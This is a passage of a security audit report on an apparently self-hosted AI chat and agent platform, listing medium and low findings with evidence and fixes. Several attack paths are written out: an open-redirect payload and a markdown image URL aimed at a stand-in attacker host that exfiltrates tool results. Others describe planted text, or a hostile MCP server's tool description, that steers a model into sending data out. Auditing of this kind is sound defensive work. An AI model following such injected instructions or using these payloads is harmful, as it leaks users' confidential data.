- Description: the rule the code applies to mailboxes is not applied to Jira, Confluence, SharePoint or WebEx content. Precise probes ("Project Falcon" layoffs, `title:"Acquisition of X"`, date bounds) confirm or refute the existence and rough volume of restricted documents on a topic.
- Impact: metadata and existence disclosure across the indexed corpus to any authenticated user, including a prompt-injected model.
- Recommendation: suppress withheld counts for providers where the user holds no grant, collapse the refused count to a boolean, and compute `weak` after the gate. Keep the timed-out count, which is operational.
- Confidence: confirmed by reading the full path.

#### R-10 The redaction gate rewrites only text blocks; card-bearing tools return the real rows unredacted in `structuredContent` [MCP-1]

- Severity: Medium
- Component: `apps/web/lib/mcp-tools/redaction-gate.ts`, `apps/web/lib/mcp-tools/jira/read.ts`, `jira-service-management/jsm.ts`, `act-preview.ts`
- Evidence: `redactResult` maps `content[]` and touches only text blocks (`redaction-gate.ts:66-75`); `jira_search_issues` puts a terse summary in the text block and every row in `structuredContent` (`jira/read.ts:496-524`); the same shape at `jsm.ts:367, 1030` and for every generated act preview (`act-preview.ts:239-240`). Both MCP clients forward `structuredContent` verbatim (`packages/mcp-client/src/client.ts:246-275`; `packages/connector-mcp/src/client.ts:195-212`).
- Description: when an organisation enables redaction, external MCP hosts (and any future consumer of `structuredContent`) receive the detected identifiers (MRN, SSN, DOB, names, phones per `packages/redaction/src/policy.ts:29-38`) unredacted. In Renkei's own chat the model is given `textOfResult` only (`turn-runner.ts:1716-1735`), so the first-party path is unaffected for the model.
- Impact: a configured data-protection control is bypassed for a whole class of tools on external clients; the MCP specification defines `structuredContent` as model-facing result content.
- Documentation: `docs/knowledge-and-security.md:38` ("applied at the MCP response boundary"); `redaction-gate.ts:55-64` ("No tool in this repo emits [a non-text block] today").
- Recommendation: walk `structuredContent` (and `_meta` a host may surface) in `redactResult` and apply `redactText` to every string leaf. Rationale: the gate is the one place that cannot be forgotten per tool, which is the file's own argument.
- Confidence: confirmed by reading the gate, the tools and both clients.

#### R-11 MCP token roles are frozen at consent and never re-derived from the identity provider; offboarding does not reach MCP clients for up to 30 days [MCP-2, AUTH-8]

- Severity: Medium
- Component: `apps/web/app/api/mcp/oauth/token/route.ts`, `packages/db/src/store/domains/oauth-tokens/postgres.ts`, `packages/settings/src/index.ts`, `apps/web/lib/session.ts`
- Evidence: on refresh, roles are copied from the newest live browser session when one exists, otherwise the frozen roles stand (`oauth-tokens/postgres.ts:105-114`); `refreshTokenTtlDays` defaults to 30 (`settings/src/index.ts:395-397`); no refresh path consults the IdP; the only revocations are the operator's "sign out everywhere" (`admin/access/[subject]/revoke-sessions/route.ts:22-30`) and the owner disconnecting Jira. Browser sessions themselves keep their roles for 30 days absolute, 12 hours idle by default and up to 30 days idle if the operator raises it (`session.ts:32, 41-47`; `org-settings/route.ts:40`).
- Description: an always-on MCP client refreshes hourly and keeps the roles it had at consent for the family's lifetime. A demoted operator keeps operator-only tools such as tenant-wide log search; a deleted IdP account keeps acting on every connector grant Renkei holds. The consent page tells users they can end access "from the Access page", which is operator-only (R-24).
- Impact: privilege persistence beyond the IdP's decision.
- Documentation: `authorize/route.ts:283-287` implies roles go stale only as long as a session would.
- Recommendation: require a live browser session on refresh (fail with `invalid_grant`, forcing re-authorisation and an IdP round trip) or cap a refresh family at the IdP session lifetime; shorten the default; document "revoke sessions" as the offboarding step; cap idle timeout for sessions carrying `renkei-operator`.
- Confidence: confirmed by reading.

#### R-12 A connected remote MCP server's self-declared `readOnlyHint` escapes read-only mode, the chat's permission ask and the agent run's read-only token; descriptions and media blocks are uncapped [MCP-5]

- Severity: Medium
- Component: `packages/connector-mcp/src/pure.ts`, `apps/web/lib/mcp-tools/mcp-servers/index.ts`, `apps/worker-agents/src/engine.ts`
- Evidence: `readOnly: annotations.readOnlyHint === true` (`pure.ts:246-258`); registered as `annotations: { readOnlyHint: tool.readOnly }` (`mcp-servers/index.ts:92-98`); the agent model token is allow-listed to tools whose `kind` is `read`, derived from those annotations (`engine.ts:757-775`; `packages/mcp-client/src/client.ts:240`); text blocks are clipped at 100,000 characters but image and audio blocks and block counts are unbounded (`mcp-servers/index.ts:110-119`).
- Description: the read/act distinction that drives organisation read-only mode, the chat's ask-before-act and the unattended run's read-only token is, for remote tools, whatever the server says about itself, and it can change on any `tools/list` refresh.
- Attack path (O4): a vendor's server turns hostile and re-lists a mutating tool as read-only with an instructing description. Agents whose owners connected it run that tool unattended with the owner's token for that server; every chat sees the injected text.
- Impact: loss of the read/act guarantee for one connector class; prompt injection into agents and chats. The blast radius is the hostile server itself plus whatever the injection achieves through the person or model.
- Recommendation: treat remote tools as acts unless the operator marks them read-only per server or per tool in the admin form; cap description length; cap total result size and drop non-text blocks; surface `tools/list` changes to the operator.
- Confidence: confirmed by reading the gating path and token derivation.

#### R-13 One database role owns and serves everything; the PHI access trail's append-only trigger can be disabled by the role that connects [DEPLOY-6, DATA-7, AGENT-8]

- Severity: Medium
- Component: `docker-compose.yaml:38-39`, `packages/db/src/migrations/141-phi-access-events.ts`, `038-audit-events.ts`, `apps/web/lib/audit-events.ts`
- Evidence: one `DATABASE_URL` for `migrate` and every runtime service; no migration creates a role, grant, policy or `SECURITY DEFINER` function (grep of all 169 migrations finds only `CREATE EXTENSION vector`). Migration 141's own header says the runtime role owns the table and that a `REVOKE` on an owner is a no-op, so the guarantee is a trigger. `audit_events` has no trigger at all (migration 038); audit writes are fire-and-forget (`audit-events.ts:247-268`).
- Description: in PostgreSQL the table owner may `ALTER TABLE … DISABLE TRIGGER` and `DROP TRIGGER` without superuser rights, so the trigger protects against the application's DML paths only, not against anyone holding the connection string, which per R-03 is every container.
- Impact: the HIPAA-style access trail and the platform audit log are not tamper-evident against the application's own credential; DEPLOYMENT.md:1111-1116 overstates the guarantee ("whatever role connects", "as a superuser").
- Recommendation: two roles created by the migrate step: an owner used only by `migrate`, and a runtime role with DML grants and `INSERT`-only on `phi_access_events` and `audit_events`; extend the append-only trigger to `audit_events`. Rationale: one migration plus one more compose variable.
- Confidence: confirmed by reading; PostgreSQL owner privileges are standard.

#### R-14 Operator-configured LLM, embeddings, OCR and web-search endpoints bypass every egress guard and accept plaintext or internal URLs, with no audit event on change [CONN-1, CONN-2]

- Severity: Medium
- Component: `apps/web/lib/agents/llm-model-payload.ts`, `apps/web/app/api/admin/connectors/{embeddings,mistral-ocr,web-search}/route.ts`, `packages/agent-llm/src/{openai,anthropic,openai-responses,models}.ts`, `packages/knowledge/src/embeddings.ts`, `packages/connector-mistral-ocr/src/client.ts`, `apps/web/app/api/admin/llm-models/{available,test}/route.ts`
- Evidence: `baseUrl` is accepted as any non-empty string (`llm-model-payload.ts:111-112`; `embeddings/route.ts:83-85`; `mistral-ocr/route.ts:77-78`; `web-search/route.ts:131-132` accepts `http:`); the adapters call the global `fetch` (`openai.ts:303`, `embeddings.ts:148`, `mistral-ocr/client.ts:171`); `safeFetch`/`assertSafeHttpsUrl` are imported only by the OIDC routes, the delegate's MCP module and the sandbox. The `available` route decrypts a stored key and sends it as a bearer to a body-supplied base URL (`available/route.ts:82-118`; `models.ts:173-176`), which its own header acknowledges.
- Description: the Mirth, ADManager and OnBase instances have a discipline for insecure transport (explicit flag, non-production label, private-host resolution, audit event in `insecure-transport.ts:61-101`). The five organisation-wide service endpoints, which receive every prompt, tool result, uploaded document text and knowledge passage plus the API key, have none, and a change to the default model's base URL leaves no audit row.
- Attack path (I5): a careless operator pastes `http://` and every chat turn travels in plaintext; a malicious operator or a stolen operator cookie repoints the default model at a host they control and exfiltrates the conversation corpus silently; the same operator reads the organisation's write-only vendor keys through the models-listing route.
- Impact: the confidentiality of the whole corpus hinges on one form field with no transport floor and no change alert; the web container becomes an internal HTTP probe for an operator.
- Documentation: `docs/onbase-connector-design.md:30-31` describes `safe-fetch` as the guard for tenant-supplied URLs.
- Recommendation: require `https:` by default and reuse `checkInsecureTransport` (flag, private-host resolution, audit event) for the on-premise gateway case; refuse loopback and link-local literals outright; emit an audit event on every base URL or key change; for `available` and `test` with a stored key, take the base URL from the stored row. Rationale: the Mirth discipline is the right template rather than full `safeFetch`, because private gateways are legitimate here.
- Confidence: confirmed by reading payload parser, store and adapter fetch.

#### R-15 Markdown images render from any origin with no enforced CSP, a zero-click exfiltration channel for prompt-injected model output [XSS-1, XSS-2]

- Severity: Medium
- Component: `apps/web/app/(app)/chat/_components/markdown.tsx`, `apps/web/app/globals.css:947`, `apps/web/lib/security-headers.ts`
- Evidence: the one `react-markdown` instance uses `skipHtml` and overrides `a` but not `img` (`markdown.tsx:276-324`); `.chat-markdown img` is styled; the CSP that names `img-src 'self' data: blob: https:` is `Content-Security-Policy-Report-Only` (`security-headers.ts:74, 116`) with no `report-to` or `report-uri`, and `security-headers.test.ts:29-31` pins the enforcing header to `undefined`.
- Description: every assistant reply, text artifact and repository README is rendered by this component. `![](https://attacker.example/p?d=…)` becomes an `<img>` the viewer's browser fetches on render. No script-injection sink was found in the browser review, so this is the practical exfiltration channel; the report-only policy reports to nobody, so its stated purpose ("review reports before enforcing", `security-headers.ts:12-17`, DEPLOYMENT.md:1088) is unmet.
- Attack path (I2): planted text in a ticket or email instructs the model to append an image whose URL encodes the previous tool result; the victim's browser sends it with no click.
- Impact: confidential chat and tool content exfiltrated to an arbitrary host; viewer tracking of shared chats and artifacts.
- Recommendation: override `img` to render only same-origin, `data:` and allow-listed provider hosts, with click-to-load for the rest, in both the chat and README renderers; add a `Reporting-Endpoints` header and a small report sink so the report-only phase produces data; enforce the nonce-free directives (`object-src`, `base-uri`, `frame-ancestors`, `form-action`) now as a second header.
- Confidence: confirmed by reading; `react-markdown` v10 default `urlTransform` behaviour is from library documentation, as `node_modules` is absent in the checkout.

#### R-16 Email-keyed identity linking trusts an unverified, non-unique claim [AUTH-2, DATA-10]

- Severity: Medium
- Component: `apps/web/lib/identity.ts`, `packages/db/src/store/domains/identities/postgres.ts`, `apps/web/lib/mcp-tools/knowledge/index.ts`, `apps/worker/src/handlers/webex-linked-user.ts`
- Evidence: the email is taken from `email`, else `preferred_username`, with no `email_verified` check (`identity.ts:179-186`); `findByEmail` orders by subject and takes the first (`identities/postgres.ts:54-62`); the index on email is non-unique (migration 019); `subjectOf(userEmail)` picks the connector credential for knowledge verification (`knowledge/index.ts:131-140`); the Microsoft, Zoom and note verifiers grant a ref when its prefix equals the identity email (`connector-microsoft/src/verifier.ts:5-34`). The identity row is written before the role check refuses a sign-in (`callback/route.ts:451-459` vs `:474-502`).
- Description: every email-to-subject hop resolves ambiguity by lexical order. Exploitability depends on the IdP letting a user influence the email claim (Entra documents `email` as mutable and not guaranteed verified; guests and self-service profiles are common cases).
- Impact: cross-user data exposure through credentials keyed by email, and mis-attribution of inbound provider events.
- Recommendation: require `email_verified === true` when present; make `(lower(email))` unique or make `findByEmail` refuse ambiguity; record the identity after the role check; state in DEPLOYMENT.md that the email claim must be immutable and verified, and key ownership refs by subject or provider account id where a connector can supply it.
- Confidence: confirmed by reading; the IdP precondition is outside the code.

#### R-17 Post-sign-in open redirect: the return-path check does not account for the URL parser stripping tab and newline characters [AUTH-1]

- Severity: Medium
- Component: `apps/web/lib/return-path.ts`, `apps/web/app/api/auth/oidc/{login,callback}/route.ts`
- Evidence (`return-path.ts:343-348`): accepts any string starting with `/` unless it starts with `//` or `/\`. The WHATWG parser removes ASCII tab, CR and LF before parsing, so `/%09/evil.com` passes the check and `new URL(redirect, origin)` at `callback/route.ts:529` resolves to `https://evil.com/`. The reviewer ran a copy of the function: `"/\t/evil.com/x" -> https://evil.com/x`.
- Attack path (O1): a link to the real host, `/api/auth/oidc/login?redirect=/%09/evil.example/login`, bounces the person through their IdP and lands them on the attacker's page with a fresh session just established, a strong phishing pretext. No session is exfiltrated by the redirect itself.
- Recommendation: validate the parsed result rather than the raw string (`new URL(candidate, 'http://x').origin === 'http://x'`, then re-serialise path, search and hash), and reject any candidate containing tab, CR, LF or backslash.
- Confidence: resolution confirmed by execution; the cookie round-trip of a tab character through Next's cookie layer was not executed (`node_modules` absent) and is expected to percent-encode.

#### R-18 Deleting a chat cascades away library, shared, project-referenced and transferred artifacts, and never deletes their bytes [CHAT-3]

- Severity: Medium
- Component: `apps/web/lib/chat/store.ts` (`deleteChat`), `packages/db/src/store/domains/chats/postgres.ts`, migrations 092 and 163, `apps/worker-agents/src/chat-sweep.ts`
- Evidence: `deleteChat` is a plain row delete plus grant and key cleanup (`store.ts:176-185`); `artifacts.chat_id` is `ON DELETE CASCADE` (migration `092-chat.ts:186`, renamed but not altered by 163); a kept or transferred artifact keeps `chat_id` pointing at the original chat (`artifact-library.ts:100-116, 434-458`); no blob-store call exists on this path, while the retention sweep deletes the blobs of every artifact in the chats it removes regardless of references (`chat-sweep.ts:166-189`).
- Description: two divergent lifecycles, both contrary to `docs/artifacts-design.md:65-67` ("a file a project holds or a person was shared outlives any one chat"). A chat owner's delete destroys another person's transferred file or a project's reference without notice, and leaves the sealed bytes in object storage with no row that can find them.
- Impact: integrity (loss of another person's file by a non-owner action) and retention ("deleted" bytes kept indefinitely).
- Recommendation: before `chats.delete`, null out `chat_id` for referenced, shared or foreign-owned artifacts (promoting their key if still chat-keyed) and delete the blobs of the rest first; teach the sweep the same distinction.
- Confidence: confirmed by reading code and migrations; not executed against a database.

#### R-19 Self-hosters pull mutable `:latest` tags from a personal registry namespace with no digest or signature verification; the publish job is gated on fewer checks than documented [DEPLOY-3]

- Severity: Medium
- Component: `docker-compose.yaml`, `.github/workflows/ci.yml`
- Evidence: twelve `image: scotteremiaroden/renkei-*:latest` entries without `@sha256:` (`docker-compose.yaml:116-571`) while third-party images are digest-pinned with a comment explaining why (`:87-94`); the `docker` job needs `[checks, security]` only (`ci.yml:337-340`) although the comment at `:311-313` says every check above gates; provenance and SBOM are attached (`:500-501`) but there is no signing step; the GitHub API shows no branch rulesets on `main` (classic protection was unreadable with the session's token).
- Description: the trust chain for every deployment is GitHub push access to `main`, a personal Docker Hub token stored as a repository secret, and tag mutability. Nothing on the consumer side pins or verifies.
- Impact: compromise of the publisher account or token, or an unprotected push to `main`, reaches every deployment on its next `docker compose pull`, with all secrets (R-03).
- Recommendation: pin first-party images by digest in the compose file and let Dependabot's `docker-compose` ecosystem propose bumps; sign images (cosign keyless with the workflow identity, or `attest-build-provenance`) and document one verification command; make the publish job depend on the browser suite, the database contract and CodeQL, or fix the comment; enable rulesets on `main` requiring the `e2e (memory store)` check the repository itself names as "the one to require"; scope and rotate the registry token, and consider publishing under the organisation.
- Confidence: confirmed by reading the workflow and compose file and by the rulesets API; classic protection unverified.

#### R-20 Organisation-wide run quota and a process-global burst brake let one member deny agent runs to everyone [AGENT-3, CONN-7, CHAT-5]

- Severity: Medium
- Component: `packages/agents/src/runs.ts`, `apps/web/app/api/agents/[agentId]/invoke/route.ts`, `packages/rate-limit/src/index.ts`, `apps/web/lib/chat/start-turn.ts`
- Evidence: the daily cap counts every run in the organisation (`runs.ts:72-82`); the invoke brake is a module-level array of 30 per minute for all callers (`invoke/route.ts:33-48`); outbound connector limiters are one bucket per connector per process (`rate-limit/src/index.ts:9-15`); the only chat concurrency rule is one running turn per chat, with no per-user cap on chats, turns or SSE streams (`start-turn.ts:261-264`).
- Description: a single member, a leaked API trigger key, or a chained agent (R-01) can exhaust the organisation's daily run budget so that everyone else's schedules fail with `DAILY_RUN_CAP`; thirty invokes a minute block "Run now" for everyone; an agent loop drains the interactive connector lane so other people's live ACL checks time out and their knowledge results are withheld.
- Impact: denial of service of shared features by an ordinary member; cost exposure against the organisation's LLM budget.
- Recommendation: per-owner and per-trigger ceilings beside the organisation cap; key the invoke brake by subject (the `checkInboundLimit` helper already does this for client logs); per-subject buckets in front of the per-connector lane; caps on concurrent turns and streams per subject.
- Confidence: confirmed by reading.

#### R-21 Security-relevant operator settings change without an audit event [AGENT-4, AUTH-3, CONN-8]

- Severity: Medium
- Component: `apps/web/app/api/admin/{redaction,agents/retention,storage,code-services/rules/**,pipeline-templates,project-templates,schedule-calendars}/route.ts`, `apps/web/app/api/oidc/route.ts`, the OnBase, Mirth and ADManager probe routes
- Evidence: only `org-settings/route.ts:329-336` emits `settings.updated`; the redaction, retention, storage and image-rule routes do not import `recordAuditEvent`; replacing the identity provider (`oidc/route.ts:175-191`) writes an info log line with no actor and no audit row; the connector probes audit only on save (`onbase/route.ts:179-187`).
- Description: switching PHI redaction off, repointing blob storage, widening the container image allow-list, and above all swapping the IdP (which hands sign-in and the operator role to whoever controls the new issuer) leave no trace an auditor can attribute.
- Recommendation: emit `settings.updated` with changed keys from every settings route; add `oidc.provider_replaced`, `storage.configured`, `code.image_rule.*` and probe actions; consider requiring a recent sign-in for the IdP route.
- Confidence: confirmed by reading.

#### R-22 The sandbox worker trusts the caller-supplied subject; the shared bearer key is the only boundary [SBX-2]

- Severity: Medium
- Component: `apps/worker-sandbox/src/server.ts`, `workspace-endpoints.ts`, all stores
- Evidence: `targetOf(body)` takes `subject` and `scope` verbatim (`server.ts:220-225`); every store query filters only on that subject; code projects are addressed as `code-project:<id>` (`apps/web/lib/code/scope.ts:13`); the sole authentication is the shared key (`server.ts:161-172`).
- Description: this is the stated design ("the bearer key is the trust boundary", `server.ts:9-13`), but there is no defence behind it: a holder of `SANDBOX_WORKER_API_KEY` reads every person's staged files and browser secrets and executes in every project's checkout. Per R-03 that key is in every container.
- Recommendation: keep the key but add a per-request MAC over `(subject, scope, op)` with a key only the web app holds, or at minimum document that the key equals full scratch-space and project access and must be rotated on any web-container incident.
- Confidence: confirmed by reading.

#### R-23 The "disclosure gate" documented as the egress control before external LLM calls, drafted emails and cards is a label lookup inside the MCP regex redactor [DATA-2, CONN-3]

- Severity: Medium (documentation discrepancy with compliance impact)
- Component: `packages/gates/src/disclosure.ts`, `packages/redaction/src/apply.ts`, `apps/web/lib/mcp-tools/redaction-gate.ts`
- Evidence: `evaluateDisclosure` has exactly one non-test caller, `apply.ts:50-54`, invoked per regex finding with channel `'mcp'`; the only policy maps six detector labels to `anonymize` with `unlabeled: 'allow'` (`policy.ts:29-38`); no content classification labels exist anywhere; the MCP gate "never blocks a call" (`redaction-gate.ts:12-16`); the only pre-model check is an operator-declared `baaCovered` flag (`agent-llm/src/data-handling.ts:89-111`).
- Description: RENKEI.md:133, 156, 252 and `docs/knowledge-and-security.md:32, 38` describe a gate that can block NDA or patient data from LLM calls, emails and any egress. What exists is best-effort masking of six identifier shapes on tool results and chat inputs when enabled. A prompt-injected agent can send any retrieved content outward through an act tool; only the human-approval policy stands in the way.
- Impact: misplaced assurance for compliance reviews; no technical block on labelled content leaving the deployment.
- Recommendation: correct the documents now; if the control is wanted, the credible minimum is a per-source label on chunk metadata and connector reads, evaluated at the MCP result boundary where `withRedaction` already sits, with a `block` decision that replaces the result.
- Confidence: confirmed by exhaustive search and reading.

### 5.3 Low

Each entry gives the component, the decisive citation, what is wrong, and the fix. Details and attack narratives are in the per-track notes.

| ID | Title | Component and evidence | Issue | Recommendation |
| --- | --- | --- | --- | --- |
| R-24 [MCP-3] | No self-service or RFC 7009 revocation for MCP clients | `apps/web/app/oauth/consent/page.tsx:131-134`; `.well-known/oauth-authorization-server/route.ts:41-42`; only `admin/access/[subject]/revoke-sessions` (operator) deletes tokens | A person cannot end a lost device's MCP access; the consent copy points to an operator-only page; metadata advertises revocation and introspection auth methods for endpoints that do not exist | Add a "connected applications" list with revoke, a `revocation_endpoint`, and truthful metadata |
| R-25 [MCP-4] | Authorisation-code redemption is read-check-then-delete; replay does not revoke issued tokens | `mcp/oauth/token/route.ts:176, 250-276` vs the atomic consent spend at `oauth-consents/postgres.ts:49-55` | Two concurrent redemptions of one code (needs code, verifier and client secret) both succeed | Spend with `DELETE … RETURNING` before issuing; revoke the client's tokens on replay of a spent code |
| R-26 [MCP-6] | Delegate MCP discovery follows redirects and guards hostnames before, not at, connect | `apps/worker-delegate/src/mcp.ts:134-146, 149-191, 233-244, 257-271` | A hostile public MCP server can 30x the delegate into internal GET and POST requests (blind; one-hop `issuer` echo) | `redirect: 'manual'` with re-guarding per hop; dial the pinned address as the sandbox fetch does |
| R-27 [MCP-7] | Transport and status routes return internal exception text | `mcp/[transport]/route.ts:635-645`; `mcp/status/route.ts:59-64` | Driver and upstream messages reach MCP clients and models | Log the message, return a fixed string with a correlation id |
| R-28 [MCP-8, XSS-6] | Widget host opens any URL scheme on `ui/open-link` | `chat/_components/widget-card.tsx:206-213` | A provider-sourced custom-scheme URL is handed to the OS on click | Allow `https:`, `mailto:`, `webexteams:` only |
| R-29 [MCP-9] | DCR and authorise throttling weaknesses | `inbound-rate-limit.ts:79-84`; `mcp/oauth/authorize/route.ts:63-155` | Registration rows never garbage-collected; consent-request insert per signed-in hit | Rate-limit authorise per session; expire unused clients; keep DCR off (default) |
| R-30 [MCP-10] | Consent screen can be made to look like a known client | `oauth/consent/page.tsx:75, 99`; `oauth-client-registration.ts:55-63` | Free-text `client_name` with the redirect host as the only tell | Show client id, registration date and redirect host prominently; operator approval of new clients when DCR is on |
| R-31 [MCP-12] | Chat-turn run tokens are unrestricted at the gateway | `lib/chat/tool-surface.ts:346-351`; `mcp/[transport]/route.ts:493` | "Acts only through preview cards" is a chat-layer convention; a leaked turn token has the full act surface (no leak path found) | Mint chat tokens with the offered tool names as an allow-list, as agent runs do |
| R-32 [AUTH-3] | Identity-provider replacement needs no re-authentication | `app/api/oidc/route.ts:175-191` | Any operator session, including a stolen cookie, can hand sign-in to a new issuer (audit gap covered in R-21) | Require a session younger than N minutes for this route |
| R-33 [AUTH-4, CONN-14] | No PKCE on the OIDC sign-in and on the confidential connector flows | `auth/oidc/login/route.ts:120-126`; `callback/route.ts:356-362`; Atlassian, Microsoft, GitHub, Zoom, WebEx authorize routes | State, nonce and cookie binding exist; PKCE is the OAuth 2.1 recommendation and the column exists | Add S256 challenge and verifier; the Salesforce and OnBase flows already do |
| R-34 [AUTH-7] | First-run `POST /api/oidc` is not rate-limited while unconfigured | `app/api/oidc/route.ts:57-86`; `setup-secret.ts:107` (16-char minimum) | A passphrase-style secret is brute-forceable in the window between `up` and setup | Apply `checkInboundLimit` as the login route does |
| R-35 [AUTH-9] | Nothing sweeps `pending_oidc_signin` or expired `sessions` | `auth/oidc/login/route.ts:68-73`; no `deleteExpired` anywhere | Storage growth from unauthenticated login starts | Periodic delete in the worker's housekeeping |
| R-36 [CRYPTO-3, SBX-3] | Git proxy tickets are bound to host and direction but not to a repository | `apps/worker-delegate/src/git.ts:107-145, 150-196`; `workspaces.ts:396-404` | For 15 minutes a workspace command can clone or push any repository the person's token reaches on that host | Record `owner/repo` on the ticket and enforce it in `proxy()` |
| R-37 [CRYPTO-4] | `TOKEN_ENCRYPTION_KEY` rotation omits two sealed columns | `packages/user-keys/src/rewrap.ts:65-109` vs `apps/worker-delegate/src/mcp.ts:111-113`, `signing.ts:297` | Dropping the old key silently breaks remote MCP refresh and unsigns instance lists; `--dry-run` cannot see it | Add `mcp_servers.encrypted_client_secret` and `delegate_signing_keys.sealed_private_key` to the targets; fail loudly on an undecryptable client secret |
| R-38 [CRYPTO-5] | Refresh lock released by processes that never acquired it; waiters refresh unlocked | `packages/provider-grants/src/refresh.ts:219-241, 252-276, 378-380` | Double refresh with rotating refresh tokens can delete a working grant | Track `lockAcquired`; waiters return a failure or re-acquire |
| R-39 [CRYPTO-6] | Disconnect and admin revoke delete the stored grant but leave most providers' tokens valid upstream | `grants.ts:808-889` (Zoom, Salesforce, OnBase, MCP only); `admin/grants/[grantId]/revoke/route.ts:14-18, 62` | Incident containment is weaker than "has been revoked" suggests | Route the operator revoke through `grant/revoke`; add GitHub, Microsoft and Atlassian revocation; label the result honestly |
| R-40 [CRYPTO-7, XSS-4] | Threat-model row understates what web-app code execution yields | `lib/keys/browser/device-store.ts:157-172`; `docs/delegate-key-design.md:98` | Any script on the origin calls `loadUserKey()` and exfiltrates the user key of every browser that loads a page, not only those who re-seal | Amend the design doc; consider Subresource Integrity or build attestation |
| R-41 [CONN-4] | Connector audience and off-switch remove tools but not indexed knowledge results | `mcp-tools/registry.ts:617-618`; `knowledge/index.ts:91-96, 246-253` | A person removed from a connector's audience still retrieves its indexed content they can read at the source | Feed the projection's connector exclusions into `searchKnowledge` |
| R-42 [CONN-5] | SMB backend has no server-side path resolution; the pure-JS SMB2 client's signing posture is unverifiable | `connector-fileshares/src/smb.ts:208-214` vs `sftp.ts:134-158`; `@tryjsky/v9u-smb2@1.1.0` (patched) | Share escape via server-side links; NTLM relay if signing is not required | Document and verify the negotiated dialect and signing; prefer SFTP for sensitive shares |
| R-43 [CONN-6] | SFTP trust-on-first-use pins whichever key the first connecting user meets | `connector-fileshares/src/host-key.ts:166-171`; `service.ts:126-136, 466-474` | One-time MITM window per share with credentials already sent | Require a fingerprint at share creation, or hold write tools until an operator confirms |
| R-44 [CONN-8] | Worker `test-connection` and `probe` accept unsaved arbitrary URLs | `apps/worker-onbase/src/server.ts:378-396`; Mirth and ADManager equivalents | Operator-driven internal HTTP status oracle from the worker containers, no audit event | Audit every probe; apply `checkInsecureTransport` to unsaved probes; refuse loopback and link-local literals |
| R-45 [CHAT-1] | Widget confirm tools are callable with arbitrary arguments, unbound to any preview | `chat/chats/[chatId]/widget/tool-call/route.ts:25-49`; `lib/chat/widget-tools.ts:85-99` | 39 `*_confirm` act tools run with the caller's own grants from a direct request, bypassing the permission ask and the person's own block list | Persist previews server-side and require `previewId`; apply `alwaysDeny` to confirm tools |
| R-46 [CHAT-2] | Widget decisions are keyed by a global `state_key` | `engine-postgres.ts:372-383`; `chat-threads/postgres.ts:74-81`; migration 128 | A chat viewer who sees a `previewId` can pre-empt the owner's confirm forever | Key by `(chat_id, state_key)` and verify the key occurs in that chat |
| R-47 [CHAT-4] | Grant revocation does not reach live SSE streams | `turns/[turnId]/stream/route.ts:76-79, 143-207` | A revoked viewer keeps receiving the running turn until it ends | Re-resolve access on each tick and close on loss |
| R-48 [CHAT-5, WEB-8] | Chunked uploads are buffered whole before the size check | `chat/attachments/route.ts:104-125`; `voice/transcribe/route.ts:47-56`; `next.config.ts:23` (110 MB) | An authenticated user makes the server buffer up to 110 MB per request | Stream with a running cap as `api/upload/[slotId]` does; refuse bodies without `Content-Length` |
| R-49 [CHAT-6] | Grant and transfer targets are unvalidated subject strings | `lib/chat/access.ts:184-204`; `artifact-library.ts:434-458` | A bogus subject strands an artifact permanently | Resolve targets against `identities` |
| R-50 [CHAT-7] | A read-only chat viewer can copy an attachment into an owned, re-shareable artifact | `artifact-library.ts:475-477` vs `docs/artifacts-design.md:56-62` | Code is looser than the design | Restrict to `mayUse(access)` or update the document |
| R-51 [AGENT-5] | Push subscription endpoint is unvalidated and upserted by endpoint | `push/subscribe/route.ts:381-395`; `notifications/postgres.ts:74-91`; `send.ts:244-254` | Blind server-side POSTs to any host; a known endpoint URL can be re-owned or deleted by another user | Accept `https:` endpoints of known push services only; key by `(subject, endpoint)` |
| R-52 [AGENT-6, XSS-8, XSS-9] | Notification open is a 302 to a stored provider URL; the custom-scheme opener page interpolates into `<script>` without `</script>` escaping; `/\host` passes the in-app path check | `notifications/[notificationId]/open/route.ts:79-120`; `packages/notifications/src/targets.ts:75-88`; `lib/notifications/targets.ts:39` | Not exploitable with today's writers (receipts allow-list `https://` and `webexteams://<uuid>`), but one new writer away from stored XSS on the app origin from a push click | Escape `<`, `>`, `&`, U+2028/9 in the JSON; allow-list the scheme; treat `/\` like `//` |
| R-53 [AGENT-7] | Re-indexing a personal watch purges the organisation-wide index for that scope | `watches/reindex/route.ts:70-73, 96-99` | A watcher can delete and re-queue everyone's chunks for a scope repeatedly | Rate-limit per watch; audit it |
| R-54 [AGENT-10] | Batch pipeline `filename-pattern` is a user-supplied regex compiled on the worker | `lib/batch-jobs/grouping.ts:13-28` | Catastrophic backtracking stalls the shared batch worker | Bound length, reject nested quantifiers, or evaluate with a timeout |
| R-55 [AGENT-11] | Rerun relabels externally sourced input as a `manual` run | `runs/[runId]/rerun/route.ts:104-123`; `act-approval.ts:114-116` | Auto-accept applies to third-party content that waited for a person on the original run | Carry the root trigger kind on reruns |
| R-56 [WEB-3] | Microsoft webhook: unauthenticated per-request database read and non-constant-time `clientState` compare | `webhooks/microsoft/[accountId]/route.ts:62-108` | Cost amplification; a hardening note on the compare (122-bit random value) | `timingSafeEqual`; cap `notifications.length` |
| R-57 [WEB-4] | WebEx per-user webhook answers 404 for unknown and 401 for known accounts | `webhooks/webex/user/[accountId]/route.ts:62-73` | Enumeration of which WebEx people opted in | Same status for both; dummy HMAC when the grant is missing |
| R-58 [WEB-5] | Bitbucket webhook authentication is a static shared secret, historically in the query string | `lib/bitbucket-webhook.ts:22-29` | The query leg leaks the secret to intermediaries; a captured secret forges events for every subscribed repository (effects bounded by re-fetch under subscriber tokens) | Deprecate the query leg; per-repository secrets |
| R-59 [WEB-6, DEPLOY-8, SBX-6] | `/api/health` and the sandbox `/health` disclose detail to anonymous callers and are unlimited | `health/route.ts:38-58`; `apps/worker-sandbox/src/server.ts:969-973` | Pending migration names, raw driver error text (host, role), capability `problems` strings | Keep the status code; move detail behind the operator role or loopback; cache for a few seconds |
| R-60 [WEB-7] | No per-message timeout in the worker loop | `packages/worker-loop/src/index.ts:114-150`; `queue/postgres.ts:41` | A stalled handler blocks the serial consumer for the 10-minute lease | Wrap the handler in a deadline below the lease and `fail()` on expiry |
| R-61 [DEPLOY-5] | HSTS is decided at image build time and CI builds without `PUBLIC_BASE_URL` | `next.config.ts:81-86`; `security-headers.ts:106-108`; `Dockerfile:91`; `ci.yml:442-445` | Published images never send `Strict-Transport-Security`, whatever the operator sets at runtime; the nginx sample masks this | Set the header in `proxy.ts` per request |
